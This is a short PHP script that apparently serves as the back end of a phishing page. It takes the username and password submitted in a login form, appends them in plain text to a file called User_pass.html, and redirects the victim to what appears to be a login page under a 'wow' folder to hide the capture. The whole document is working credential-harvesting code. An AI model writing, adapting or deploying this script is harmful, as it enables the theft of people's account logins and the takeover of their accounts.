<?php

$username = $_POST['username'];
$password = $_POST['password'];
$credentials = "<div style='border-bottom:dotted yellow 1px;padding:20px;'>Username: $username & Password: $password </div>" ;

$filename = "User_pass.html";

$fun = fopen($filename, 'a');
fwrite($fun, $credentials);
fclose($fun);

header("Location:../wow/login.php");
?>

     